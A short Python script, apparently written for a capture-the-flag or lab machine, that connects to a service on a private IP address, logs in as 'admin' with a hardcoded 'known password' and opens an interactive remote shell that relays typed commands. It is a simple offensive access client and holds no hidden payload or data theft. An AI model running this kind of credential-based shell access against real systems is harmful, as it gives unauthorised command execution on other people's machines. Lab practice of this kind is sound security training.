import socket
import time

# Configuration
target_ip = "10.10.135.161"  # Target IP
target_port = 8000           # Target port
password = "abc123"          # Known password

def connect_and_interact():
    try:
        # Create a socket and connect to the target IP and port
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))

        # Send 'admin' to the server
        send_data(client_socket, 'admin')

        # Receive the response from the server after sending 'admin'
        response = receive_data(client_socket)
        print(f"Server response after sending 'admin': {response}")

        # Wait for the server to send "Password:"
        if "Password:" in response:
            print(f"Sending password: {password}")
            send_data(client_socket, password)

            # Receive the response after sending the password
            response = receive_data(client_socket)
            print(f"Response after sending password: {response}")

            # Send 'shell' command after receiving the welcome message
            send_data(client_socket, 'shell')
            print("Sent 'shell' command. Waiting for shell response...")
            time.sleep(1)  # Add a small delay to give the server time to process
            response = receive_data(client_socket)
            print(f"Shell response: {response}")

            if "Password:" in response:
                print("Server still waiting for input. Sending 'ls' command.")
                send_data(client_socket, 'ls')
                response = receive_data(client_socket)
                print(f"Response after sending 'ls': {response}")

            # Now interact with the shell
            interact_with_shell(client_socket)
        else:
            print("Did not receive the 'Password:' prompt.")

    except Exception as e:
        print(f"Error during connection or communication: {e}")

    finally:
        if client_socket:
            client_socket.close()

def send_data(client_socket, data):
    """Helper function to send data to the server."""
    client_socket.sendall(f"{data}\r\n".encode('utf-8'))

def receive_data(client_socket):
    """Helper function to receive and decode server response."""
    response = client_socket.recv(4096).decode('utf-8').strip()
    return response

def interact_with_shell(client_socket):
    try:
        while True:
            command = input("PyShell > ")
            send_data(client_socket, command)  # Send the command
            response = receive_data(client_socket)  # Receive the response
            print(f"Response: {response}")

    except Exception as e:
        print(f"Error during interaction: {e}")

if __name__ == "__main__":
    connect_and_interact()
